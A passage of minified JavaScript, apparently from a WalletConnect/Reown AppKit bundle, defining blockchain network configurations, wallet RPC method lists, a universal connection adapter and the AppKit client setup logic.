Testnet",testnet:!0,id:17069,sourceId:jp,nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.garnetchain.com"],webSocket:["wss://rpc.garnetchain.com"]}},blockExplorers:{default:{name:"Blockscout",url:"https://explorer.garnetchain.com"}},contracts:{...ye.contracts,multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11"},portal:{[jp]:{address:"0x57ee40586fbE286AfC75E67cb69511A6D9aF5909",blockCreated:1274684}},l2OutputOracle:{[jp]:{address:"0xCb8E7AC561b8EF04F2a15865e9fbc0766FEF569B",blockCreated:1274684}},l1StandardBridge:{[jp]:{address:"0x09bcDd311FE398F80a78BE37E489f5D440DB95DE",blockCreated:1274684}}}});({...ye.contracts});({...ye.contracts},di({id:701,name:"Koi Network",nativeCurrency:{decimals:18,name:"Koi Network Native Token",symbol:"KRING"},rpcUrls:{default:{http:["https://koi-rpc.darwinia.network"],webSocket:["wss://koi-rpc.darwinia.network"]}},blockExplorers:{default:{name:"Blockscout",url:"https://koi-scan.darwinia.network"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:180001}},testnet:!0}));({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});const X4=11155111;di({...ye,name:"Pyrope Testnet",testnet:!0,id:695569,sourceId:X4,nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.pyropechain.com"],webSocket:["wss://rpc.pyropechain.com"]}},blockExplorers:{default:{name:"Blockscout",url:"https://pyrope.blockscout.com"}},contracts:{...ye.contracts,l1StandardBridge:{[X4]:{address:"0xC24932c31D9621aE9e792576152B7ef010cFC2F8"}}}});const Hp=1;di({...ye,name:"Redstone",id:690,sourceId:Hp,nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.redstonechain.com"],webSocket:["wss://rpc.redstonechain.com"]}},blockExplorers:{default:{name:"Blockscout",url:"https://explorer.redstone.xyz"}},contracts:{...ye.contracts,multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11"},portal:{[Hp]:{address:"0xC7bCb0e8839a28A1cFadd1CF716de9016CdA51ae",blockCreated:19578329}},l2OutputOracle:{[Hp]:{address:"0xa426A052f657AEEefc298b3B5c35a470e4739d69",blockCreated:19578337}},l1StandardBridge:{[Hp]:{address:"0xc473ca7E02af24c129c2eEf51F2aDf0411c1Df69",blockCreated:19578331}}}});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts},{...ye.contracts}),{...ye.contracts};({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});function Vl(t){return{formatters:void 0,fees:void 0,serializers:void 0,...t}}const e8=Vl({id:"5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",name:"Solana",network:"solana-mainnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!1,chainNamespace:"solana",caipNetworkId:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",deprecatedCaipNetworkId:"solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"}),t8=Vl({id:"EtWTRABZaYq6iMfeYKouRu166VU2xqa1",name:"Solana Devnet",network:"solana-devnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1",deprecatedCaipNetworkId:"solana:8E9rvCKLFQia2Y35HXjjpWzj8weVo44K"});Vl({id:"4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z",name:"Solana Testnet",network:"solana-testnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z"}),Vl({id:"000000000019d6689c085ae165831e93",caipNetworkId:"bip122:000000000019d6689c085ae165831e93",chainNamespace:"bip122",name:"Bitcoin",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}}),Vl({id:"000000000933ea01ad0ee984209779ba",caipNetworkId:"bip122:000000000933ea01ad0ee984209779ba",chainNamespace:"bip122",name:"Bitcoin Testnet",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},testnet:!0});const YW={solana:["solana_signMessage","solana_signTransaction","solana_requestAccounts","solana_getAccounts","solana_signAllTransactions","solana_signAndSendTransaction"],eip155:["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_showCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"],bip122:["sendTransfer","signMessage","signPsbt","getAccountAddresses"]},P9={getMethodsByChainNamespace(t){return YW[t]||[]},createDefaultNamespace(t){return{methods:this.getMethodsByChainNamespace(t),events:["accountsChanged","chainChanged"],chains:[],rpcMap:{}}},applyNamespaceOverrides(t,e){if(!e)return{...t};const r={...t},n=new Set;if(e.methods&&Object.keys(e.methods).forEach(i=>n.add(i)),e.chains&&Object.keys(e.chains).forEach(i=>n.add(i)),e.events&&Object.keys(e.events).forEach(i=>n.add(i)),e.rpcMap&&Object.keys(e.rpcMap).forEach(i=>{const[s]=i.split(":");s&&n.add(s)}),n.forEach(i=>{r[i]||(r[i]=this.createDefaultNamespace(i))}),e.methods&&Object.entries(e.methods).forEach(([i,s])=>{r[i]&&(r[i].methods=s)}),e.chains&&Object.entries(e.chains).forEach(([i,s])=>{r[i]&&(r[i].chains=s)}),e.events&&Object.entries(e.events).forEach(([i,s])=>{r[i]&&(r[i].events=s)}),e.rpcMap){const i=new Set;Object.entries(e.rpcMap).forEach(([s,o])=>{const[a,c]=s.split(":");!a||!c||!r[a]||(r[a].rpcMap||(r[a].rpcMap={}),i.has(a)||(r[a].rpcMap={},i.add(a)),r[a].rpcMap[c]=o)})}return r},createNamespaces(t,e){const r=t.reduce((n,i)=>{const{id:s,chainNamespace:o,rpcUrls:a}=i,c=a.default.http[0];n[o]||(n[o]=this.createDefaultNamespace(o));const l=`${o}:${s}`,u=n[o];switch(u.chains.push(l),l){case e8.caipNetworkId:u.chains.push(e8.deprecatedCaipNetworkId);break;case t8.caipNetworkId:u.chains.push(t8.deprecatedCaipNetworkId);break}return u!=null&&u.rpcMap&&c&&(u.rpcMap[s]=c),n},{});return this.applyNamespaceOverrides(r,e)},resolveReownName:async t=>{var r;const e=await w9.resolveName(t);return((r=(Object.values(e==null?void 0:e.addresses)||[])[0])==null?void 0:r.address)||!1},getChainsFromNamespaces(t={}){return Object.values(t).flatMap(e=>{const r=e.chains||[],n=e.accounts.map(i=>{const[s,o]=i.split(":");return`${s}:${o}`});return Array.from(new Set([...r,...n]))})},isSessionEventData(t){return typeof t=="object"&&t!==null&&"id"in t&&"topic"in t&&"params"in t&&typeof t.params=="object"&&t.params!==null&&"chainId"in t.params&&"event"in t.params&&typeof t.params.event=="object"&&t.params.event!==null}};class k9{constructor({provider:e,namespace:r}){this.id=ve.CONNECTOR_ID.WALLET_CONNECT,this.name=lg.ConnectorNamesMap[ve.CONNECTOR_ID.WALLET_CONNECT],this.type="WALLET_CONNECT",this.imageId=lg.ConnectorImageIds[ve.CONNECTOR_ID.WALLET_CONNECT],this.getCaipNetworks=B.getCaipNetworks.bind(B),this.caipNetworks=this.getCaipNetworks(),this.provider=e,this.chain=r}get chains(){return this.getCaipNetworks()}async connectWalletConnect(){if(!await this.authenticate()){const e=this.getCaipNetworks(),r=Y.state.universalProviderConfigOverride,n=P9.createNamespaces(e,r);await this.provider.connect({optionalNamespaces:n})}return{clientId:await this.provider.client.core.crypto.getClientId(),session:this.provider.session}}async disconnect(){await this.provider.disconnect()}async authenticate(){const e=this.chains.map(r=>r.caipNetworkId);return Uo.universalProviderAuthenticate({universalProvider:this.provider,chains:e,methods:XW})}}const XW=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"];class eG{constructor(e){this.availableConnectors=[],this.eventListeners=new Map,this.getCaipNetworks=r=>B.getCaipNetworks(r),e&&this.construct(e)}construct(e){this.projectId=e.projectId,this.namespace=e.namespace,this.adapterType=e.adapterType}get connectors(){return this.availableConnectors}get networks(){return this.getCaipNetworks(this.namespace)}setAuthProvider(e){this.addConnector({id:ve.CONNECTOR_ID.AUTH,type:"AUTH",name:ve.CONNECTOR_NAMES.AUTH,provider:e,imageId:lg.ConnectorImageIds[ve.CONNECTOR_ID.AUTH],chain:this.namespace,chains:[]})}addConnector(...e){const r=new Set;this.availableConnectors=[...e,...this.availableConnectors].filter(n=>r.has(n.id)?!1:(r.add(n.id),!0)),this.emit("connectors",this.availableConnectors)}setStatus(e,r){me.setStatus(e,r)}on(e,r){var n;this.eventListeners.has(e)||this.eventListeners.set(e,new Set),(n=this.eventListeners.get(e))==null||n.add(r)}off(e,r){const n=this.eventListeners.get(e);n&&n.delete(r)}removeAllEventListeners(){this.eventListeners.forEach(e=>{e.clear()})}emit(e,r){const n=this.eventListeners.get(e);n&&n.forEach(i=>i(r))}async connectWalletConnect(e){return{clientId:(await this.getWalletConnectConnector().connectWalletConnect()).clientId}}async switchNetwork(e){var s;const{caipNetwork:r,providerType:n}=e;if(!e.provider)return;const i="provider"in e.provider?e.provider.provider:e.provider;if(n==="WALLET_CONNECT"){i.setDefaultChain(r.caipNetworkId);return}if(i&&n==="AUTH"){const o=i,a=(s=me.state.preferredAccountTypes)==null?void 0:s[r.chainNamespace];await o.switchNetwork(r.caipNetworkId);const c=await o.getUser({chainId:r.caipNetworkId,preferredAccountType:a});this.emit("switchNetwork",c)}}getWalletConnectConnector(){const e=this.connectors.find(r=>r instanceof k9);if(!e)throw new Error("WalletConnectConnector not found");return e}}class tG extends eG{setUniversalProvider(e){this.addConnector(new k9({provider:e,caipNetworks:this.getCaipNetworks(),namespace:this.namespace}))}async connect(e){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:Number(e.chainId),provider:this.provider,address:""})}async disconnect(){try{await this.getWalletConnectConnector().disconnect()}catch(e){console.warn("UniversalAdapter:disconnect - error",e)}}async getAccounts({namespace:e}){var n,i,s,o,a;const r=((a=(o=(s=(i=(n=this.provider)==null?void 0:n.session)==null?void 0:i.namespaces)==null?void 0:s[e])==null?void 0:o.accounts)==null?void 0:a.map(c=>{const[,,l]=c.split(":");return l}).filter((c,l,u)=>u.indexOf(c)===l))||[];return Promise.resolve({accounts:r.map(c=>te.createAccount(e,c,e==="bip122"?"payment":"eoa"))})}async syncConnectors(){return Promise.resolve()}async getBalance(e){var n,i,s,o,a;if(!(e.caipNetwork&&Ut.BALANCE_SUPPORTED_CHAINS.includes((n=e.caipNetwork)==null?void 0:n.chainNamespace))||(i=e.caipNetwork)!=null&&i.testnet)return{balance:"0.00",symbol:((s=e.caipNetwork)==null?void 0:s.nativeCurrency.symbol)||""};if(me.state.balanceLoading&&e.chainId===((o=B.state.activeCaipNetwork)==null?void 0:o.id))return{balance:me.state.balance||"0.00",symbol:me.state.balanceSymbol||""};const r=(await me.fetchTokenBalance()).find(c=>{var l,u;return c.chainId===`${(l=e.caipNetwork)==null?void 0:l.chainNamespace}:${e.chainId}`&&c.symbol===((u=e.caipNetwork)==null?void 0:u.nativeCurrency.symbol)});return{balance:(r==null?void 0:r.quantity.numeric)||"0.00",symbol:(r==null?void 0:r.symbol)||((a=e.caipNetwork)==null?void 0:a.nativeCurrency.symbol)||""}}async signMessage(e){var o,a,c;const{provider:r,message:n,address:i}=e;if(!r)throw new Error("UniversalAdapter:signMessage - provider is undefined");let s="";return((o=B.state.activeCaipNetwork)==null?void 0:o.chainNamespace)===ve.CHAIN.SOLANA?s=(await r.request({method:"solana_signMessage",params:{message:HW.encode(new TextEncoder().encode(n)),pubkey:i}},(a=B.state.activeCaipNetwork)==null?void 0:a.caipNetworkId)).signature:s=await r.request({method:"personal_sign",params:[n,i]},(c=B.state.activeCaipNetwork)==null?void 0:c.caipNetworkId),{signature:s}}async estimateGas(){return Promise.resolve({gas:BigInt(0)})}async getProfile(){return Promise.resolve({profileImage:"",profileName:""})}async sendTransaction(){return Promise.resolve({hash:""})}walletGetAssets(e){return Promise.resolve({})}async writeContract(){return Promise.resolve({hash:""})}async getEnsAddress(){return Promise.resolve({address:!1})}parseUnits(){return 0n}formatUnits(){return"0"}async getCapabilities(){return Promise.resolve({})}async grantPermissions(){return Promise.resolve({})}async revokePermissions(){return Promise.resolve("0x")}async syncConnection(){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:1,provider:this.provider,address:""})}async switchNetwork(e){var i,s,o,a,c,l;const{caipNetwork:r}=e,n=this.getWalletConnectConnector();if(r.chainNamespace===ve.CHAIN.EVM)try{await((i=n.provider)==null?void 0:i.request({method:"wallet_switchEthereumChain",params:[{chainId:Oe(r.id)}]}))}catch(u){if(u.code===zp.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||u.code===zp.ERROR_INVALID_CHAIN_ID||u.code===zp.ERROR_CODE_DEFAULT||((o=(s=u==null?void 0:u.data)==null?void 0:s.originalError)==null?void 0:o.code)===zp.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)try{await((l=n.provider)==null?void 0:l.request({method:"wallet_addEthereumChain",params:[{chainId:Oe(r.id),rpcUrls:[(a=r==null?void 0:r.rpcUrls.chainDefault)==null?void 0:a.http],chainName:r.name,nativeCurrency:r.nativeCurrency,blockExplorerUrls:[(c=r.blockExplorers)==null?void 0:c.default.url]}]}))}catch{throw new Error("Chain is not supported")}}n.provider.setDefaultChain(r.caipNetworkId)}getWalletConnectProvider(){var e;return(e=this.connectors.find(r=>r.type==="WALLET_CONNECT"))==null?void 0:e.provider}}class rG{constructor(e){this.chainNamespaces=[],this.reportedAlertErrors={},this.getCaipNetwork=(r,n)=>{var i,s,o,a;if(r){const c=(s=(i=B.getNetworkData(r))==null?void 0:i.requestedCaipNetworks)==null?void 0:s.find(u=>u.id===n);return c||((o=B.getNetworkData(r))==null?void 0:o.caipNetwork)||((a=B.getRequestedCaipNetworks(r).filter(u=>u.chainNamespace===r))==null?void 0:a[0])}return B.state.activeCaipNetwork||this.defaultCaipNetwork},this.getCaipNetworkId=()=>{const r=this.getCaipNetwork();if(r)return r.id},this.getCaipNetworks=r=>B.getCaipNetworks(r),this.getActiveChainNamespace=()=>B.state.activeChain,this.setRequestedCaipNetworks=(r,n)=>{B.setRequestedCaipNetworks(r,n)},this.getApprovedCaipNetworkIds=()=>B.getAllApprovedCaipNetworkIds(),this.getCaipAddress=r=>B.state.activeChain===r||!r?B.state.activeCaipAddress:B.getAccountProp("caipAddress",r),this.setClientId=r=>{Ie.setClientId(r)},this.getProvider=r=>bt.getProvider(r),this.getProviderType=r=>bt.getProviderId(r),this.getPreferredAccountType=r=>{var n;return(n=me.state.preferredAccountTypes)==null?void 0:n[r]},this.setCaipAddress=(r,n)=>{me.setCaipAddress(r,n)},this.setBalance=(r,n,i)=>{me.setBalance(r,n,i)},this.setProfileName=(r,n)=>{me.setProfileName(r,n)},this.setProfileImage=(r,n)=>{me.setProfileImage(r,n)},this.setUser=(r,n)=>{me.setUser(r,n),Y.state.enableEmbedded&&qe.close()},this.resetAccount=r=>{me.resetAccount(r)},this.setCaipNetwork=r=>{B.setActiveCaipNetwork(r)},this.setCaipNetworkOfNamespace=(r,n)=>{B.setChainNetworkData(n,{caipNetwork:r})},this.setAllAccounts=(r,n)=>{me.setAllAccounts(r,n),Y.setHasMultipleAddresses((r==null?void 0:r.length)>1)},this.setStatus=(r,n)=>{me.setStatus(r,n),ae.isConnected()?pe.setConnectionStatus("connected"):pe.setConnectionStatus("disconnected")},this.getAddressByChainNamespace=r=>B.getAccountProp("address",r),this.setConnectors=r=>{const n=[...ae.state.allConnectors,...r];ae.setConnectors(n)},this.fetchIdentity=r=>Ie.fetchIdentity(r),this.getReownName=r=>w9.getNamesForAddress(r),this.getConnectors=()=>ae.getConnectors(),this.getConnectorImage=r=>Mt.getConnectorImage(r),this.setConnectedWalletInfo=(r,n)=>{const i=bt.getProviderId(n),s=r?{...r,type:i}:void 0;me.setConnectedWalletInfo(s,n)},this.getIsConnectedState=()=>!!B.state.activeCaipAddress,this.addAddressLabel=(r,n,i)=>{me.addAddressLabel(r,n,i)},this.removeAddressLabel=(r,n)=>{me.removeAddressLabel(r,n)},this.getAddress=r=>B.state.activeChain===r||!r?me.state.address:B.getAccountProp("address",r),this.setApprovedCaipNetworksData=r=>B.setApprovedCaipNetworksData(r),this.resetNetwork=r=>{B.resetNetwork(r)},this.addConnector=r=>{ae.addConnector(r)},this.resetWcConnection=()=>{we.resetWcConnection()},this.setAddressExplorerUrl=(r,n)=>{me.setAddressExplorerUrl(r,n)},this.setSmartAccountDeployed=(r,n)=>{me.setSmartAccountDeployed(r,n)},this.setSmartAccountEnabledNetworks=(r,n)=>{B.setSmartAccountEnabledNetworks(r,n)},this.setPreferredAccountType=(r,n)=>{me.setPreferredAccountType(r,n)},this.setEIP6963Enabled=r=>{Y.setEIP6963Enabled(r)},this.handleUnsafeRPCRequest=()=>{if(this.isOpen()){if(this.isTransactionStackEmpty())return;this.redirect("ApproveTransaction")}else this.open({view:"ApproveTransaction"})},this.options=e,this.version=e.sdkVersion,this.caipNetworks=this.extendCaipNetworks(e),this.chainNamespaces=this.getChainNamespacesSet(e.adapters,this.caipNetworks),this.defaultCaipNetwork=this.extendDefaultCaipNetwork(e),this.chainAdapters=this.createAdapters(e.adapters),this.initialize(e)}getChainNamespacesSet(e,r){const n=e==null?void 0:e.map(s=>s.namespace).filter(s=>!!s);if(n!=null&&n.length)return[...new Set(n)];const i=r==null?void 0:r.map(s=>s.chainNamespace);return[...new Set(i)]}async initialize(e){this.initControllers(e),await this.initChainAdapters(),await this.injectModalUi(),this.sendInitializeEvent(e),Us.set({initialized:!0}),await this.syncExistingConnection()}sendInitializeEvent(e){var n;const{...r}=e;delete r.adapters,delete r.universalProvider,De.sendEvent({type:"track",event:"INITIALIZE",properties:{...r,networks:e.networks.map(i=>i.id),siweConfig:{options:((n=e.siweConfig)==null?void 0:n.options)||{}}}})}initControllers(e){this.initializeOptionsController(e),this.initializeChainController(e),this.initializeThemeController(e),this.initializeConnectionController(e),this.initializeConnectorController()}initializeThemeController(e){e.themeMode&&Bt.setThemeMode(e.themeMode),e.themeVariables&&Bt.setThemeVariables(e.themeVariables)}initializeChainController(e){if(!this.connectionControllerClient||!this.networkControllerClient)throw new Error("ConnectionControllerClient and NetworkControllerClient must be set");B.initialize(e.adapters??[],this.caipNetworks,{connectionControllerClient:this.connectionControllerClient,networkControllerClient:this.networkControllerClient});const r=this.getDefaultNetwork();r&&B.setActiveCaipNetwork(r)}initializeConnectionController(e){we.setWcBasic(e.basic??!1)}initializeConnectorController(){ae.initialize(this.chainNamespaces)}initializeOptionsController(e){var s;Y.setDebug(e.debug!==!1),Y.setEnableWalletConnect(e.enableWalletConnect!==!1),Y.setEnableWalletGuide(e.enableWalletGuide!==!1),Y.setEnableWallets(e.enableWallets!==!1),Y.setEIP6963Enabled(e.enableEIP6963!==!1),Y.setEnableNetworkSwitch(e.enableNetworkSwitch!==!1),Y.setEnableAuthLogger(e.enableAuthLogger!==!1),Y.setCustomRpcUrls(e.customRpcUrls),Y.setSdkVersion(e.sdkVersion),Y.setProjectId(e.projectId),Y.setEnableEmbedded(e.enableEmbedded),Y.setAllWallets(e.allWallets),Y.setIncludeWalletIds(e.includeWalletIds),Y.setExcludeWalletIds(e.excludeWalletIds),Y.setFeaturedWalletIds(e.featuredWalletIds),Y.setTokens(e.tokens),Y.setTermsConditionsUrl(e.termsConditionsUrl),Y.setPrivacyPolicyUrl(e.privacyPolicyUrl),Y.setCustomWallets(e.customWallets),Y.setFeatures(e.features),Y.setAllowUnsupportedChain(e.allowUnsupportedChain),Y.setUniversalProviderConfigOverride(e.universalProviderConfigOverride),Y.setDefaultAccountTypes(e.defaultAccountTypes);const r=pe.getPreferredAccountTypes(),n={...Y.state.defaultAccountTypes,...r};me.setPreferredAccountTypes(n);const i=this.getDefaultMetaData();if(!e.metadata&&i&&(e.metadata=i),Y.setMetadata(e.metadata),Y.setDisableAppend(e.disableAppend),Y.setEnableEmbedded(e.enableEmbedded),Y.setSIWX(e.siwx),!e.projectId){Lo.open(Mp.ALERT_ERRORS.PROJECT_ID_NOT_CONFIGURED,"error");return}if((s=e.adapters)!=null&&s.find(o=>o.namespace===ve.CHAIN.EVM)&&e.siweConfig){if(e.siwx)throw new Error("Cannot set both `siweConfig` and `siwx` options");Y.setSIWX(e.siweConfig.mapToSIWX())}}getDefaultMetaData(){var e,r,n,i;return typeof window<"u"&&typeof document<"u"?{name:((r=(e=document.getElementsByTagName("title"))==null?void 0:e[0])==null?void 0:r.textContent)||"",description:((n=document.querySelector('meta[property="og:description"]'))==null?void 0:n.content)||"",url:window.location.origin,icons:[((i=document.querySelector('link[rel~="icon"]'))==null?void 0:i.href)||""]}:null}setUnsupportedNetwork(e){const r=this.getActiveChainNamespace();if(r){const n=xl.getUnsupportedNetwork(`${r}:${e}`);B.setActiveCaipNetwork(n)}}getDefaultNetwork(){return xl.getCaipNetworkFromStorage(this.defaultCaipNetwork)}extendCaipNetwork(e,r){return xl.extendCaipNetwork(e,{customNetworkImageUrls:r.chainImages,projectId:r.projectId})}extendCaipNetworks(e){return xl.extendCaipNetworks(e.networks,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId})}extendDefaultCaipNetwork(e){const r=e.networks.find(n=>{var i;return n.id===((i=e.defaultNetwork)==null?void 0:i.id)});return r?xl.extendCaipNetwork(r,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId}):void 0}createClients(){this.connectionControllerClient={connectWalletConnect:async()=>{var s;const e=B.state.activeChain,r=this.getAdapter(e),n=(s=this.getCaipNetwork(e))==null?void 0:s.id;if(!r)throw new Error("Adapter not found");const i=await r.connectWalletConnect(n);this.close(),this.setClientId((i==null?void 0:i.clientId)||null),pe.setConnectedNamespaces([...B.state.chains.keys()]),this.chainNamespaces.forEach(o=>{ae.setConnectorId(oo.CONNECTOR_TYPE_WALLET_CONNECT,o)}),await this.syncWalletConnectAccount()},connectExternal:async({id:e,info:r,type:n,provider:i,chain:s,caipNetwork:o})=>{var f,g,p,w,m,b;const a=B.state.activeChain,c=s||a,l=this.getAdapter(c);if(s&&s!==a&&!o){const v=this.getCaipNetworks().find(x=>x.chainNamespace===s);v&&this.setCaipNetwork(v)}if(!l)throw new Error("Adapter not found");const u=this.getCaipNetwork(c),h=await l.connect({id:e,info:r,type:n,provider:i,chainId:(o==null?void 0:o.id)||(u==null?void 0:u.id),rpcUrl:((p=(g=(f=o==null?void 0:o.rpcUrls)==null?void 0:f.default)==null?void 0:g.http)==null?void 0:p[0])||((b=(m=(w=u==null?void 0:u.rpcUrls)==null?void 0:w.default)==null?void 0:m.http)==null?void 0:b[0])});if(!h)return;pe.addConnectedNamespace(c),this.syncProvider({...h,chainNamespace:c});const{accounts:d}=await l.getAccounts({namespace:c,id:e});this.setAllAccounts(d,c),this.setStatus("connected",c)},reconnectExternal:async({id:e,info:r,type:n,provider:i})=>{var a;const s=B.state.activeChain,o=this.getAdapter(s);o!=null&&o.reconnect&&(await(o==null?void 0:o.reconnect({id:e,info:r,type:n,provider:i,chainId:(a=this.getCaipNetwork())==null?void 0:a.id})),pe.addConnectedNamespace(s))},disconnect:async e=>{const r=e||B.state.activeChain,n=this.getAdapter(r),i=bt.getProvider(r),s=bt.getProviderId(r);await(n==null?void 0:n.disconnect({provider:i,providerType:s})),pe.removeConnectedNamespace(r),bt.resetChain(r),this.setUser(void 0,r),this.setStatus("disconnected",r)},checkInstalled:e=>e?e.some(r=>{var n;return!!((n=window.ethereum)!=null&&n[String(r)])}):!!window.ethereum,signMessage:async e=>{var r,n;return((n=await((r=this.getAdapter(B.state.activeChain))==null?void 0:r.signMessage({message:e,address:me.state.address,provider:bt.getProvider(B.state.activeChain)})))==null?void 0:n.signature)||""},sendTransaction:async e=>{var r;if(e.chainNamespace===ve.CHAIN.EVM){const n=this.getAdapter(B.state.activeChain),i=bt.getProvider(B.state.activeChain);return((r=await(n==null?void 0:n.sendTransaction({...e,caipNetwork:this.getCaipNetwork(),provider:i})))==null?void 0:r.hash)||""}return""},estimateGas:async e=>{var r;if(e.chainNamespace===ve.CHAIN.EVM){const n=this.getAdapter(B.state.activeChain),i=bt.getProvider(B.state.activeChain),s=this.getCaipNetwork();if(!s)throw new Error("CaipNetwork is undefined");return((r=await(n==null?void 0:n.estimateGas({...e,provider:i,caipNetwork:s})))==null?void 0:r.gas)||0n}return 0n},getEnsAvatar:async()=>{var e,r,n;return((n=await((r=this.getAdapter(B.state.activeChain))==null?void 0:r.getProfile({address:me.state.address,chainId:Number((e=this.getCaipNetwork())==null?void 0:e.id)})))==null?void 0:n.profileImage)||!1},getEnsAddress:async e=>{var i;const r=this.getAdapter(B.state.activeChain),n=this.getCaipNetwork();return n&&((i=await(r==null?void 0:r.getEnsAddress({name:e,caipNetwork:n})))==null?void 0:i.address)||!1},writeContract:async e=>{var o;const r=this.getAdapter(B.state.activeChain),n=this.getCaipNetwork(),i=this.getCaipAddress(),s=bt.getProvider(B.state.activeChain);if(!n||!i)throw new Error("CaipNetwork or CaipAddress is undefined");return(o=await(r==null?void 0:r.writeContract({...e,caipNetwork:n,provider:s,caipAddress:i})))==null?void 0:o.hash},parseUnits:(e,r)=>{var n;return((n=this.getAdapter(B.state.activeChain))==null?void 0:n.parseUnits({value:e,decimals:r}))??0n},formatUnits:(e,r)=>{var n;return((n=this.getAdapter(B.state.activeChain))==null?void 0:n.formatUnits({value:e,decimals:r}))??"0"},getCapabilities:async e=>{var r;return await((r=this.getAdapter(B.state.activeChain))==null?void 0:r.getCapabilities(e))},grantPermissions:async e=>{var r;return await((r=this.getAdapter(B.state.activeChain))==null?void 0:r.grantPermissions(e))},revokePermissions:async e=>{const r=this.getAdapter(B.state.activeChain);return r!=null&&r.revokePermissions?await r.revokePermissions(e):"0x"},walletGetAssets:async e=>{var r;return await((r=this.getAdapter(B.state.activeChain))==null?void 0:r.walletGetAssets(e))??{}}},this.networkControllerClient={switchCaipNetwork:async e=>await this.switchCaipNetwork(e),getApprovedCaipNetworksData:async()=>this.getApprovedCaipNetworksData()},we.setClient(this.connectionControllerClient)}getApprovedCaipNetworksData(){var e,r,n,i,s;if(bt.getProviderId(B.state.activeChain)===oo.CONNECTOR_TYPE_WALLET_CONNECT){const o=(r=(e=this.universalProvider)==null?void 0:e.session)==null?void 0:r.namespaces;return{supportsAllNetworks:((s=(i=(n=this.universalProvider)==null?void 0:n.session)==null?void 0:i.peer)==null?void 0:s.metadata.name)==="MetaMask Wallet",approvedCaipNetworkIds:this.getChainsFromNamespaces(o)}}return{supportsAllNetworks:!0,approvedCaipNetworkIds:[]}}async switchCaipNetwork(e){var n;if(!e)return;const r=e.chainNamespace;if(this.getAddressByChainNamespace(e.chainNamespace)){const i=bt.getProvider(r),s=bt.getProviderId(r);if(e.chainNamespace===B.state.activeChain)await((n=this.getAdapter(r))==null?void 0:n.switchNetwork({caipNetwork:e,provider:i,providerType:s}));else if(this.setCaipNetwork(e),s===oo.CONNECTOR_TYPE_WALLET_CONNECT)this.syncWalletConnectAccount();else{const o=this.getAddressByChainNamespace(r);o&&this.syncAccount({address:o,chainId:e.id,chainNamespace:r})}}else this.setCaipNetwork(e)}getChainsFromNamespaces(e={}){return Object.values(e).flatMap(r=>{const n=r.chains||[],i=r.accounts.map(s=>{const{chainId:o,chainNamespace:a}=Js.parseCaipAddress(s);return`${a}:${o}`});return Array.from(new Set([...n,...i]))})}createAdapters(e){return this.createClients(),this.chainNamespaces.reduce((r,n)=>{var s;const i=e==null?void 0:e.find(o=>o.namespace===n);return i?(i.construct({namespace:n,projectId:(s=this.options)==null?void 0:s.projectId,networks:this.getCaipNetworks()}),r[n]=i):r[n]=new tG({namespace:n,networks:this.getCaipNetworks()}),r},{})}async initChainAdapter(e){var r;this.onConnectors(e),this.listenAdapter(e),(r=this.chainAdapters)==null||r[e].syncConnectors(this.options,this),await this.createUniversalProviderForAdapter(e)}async initChainAdapters(){await 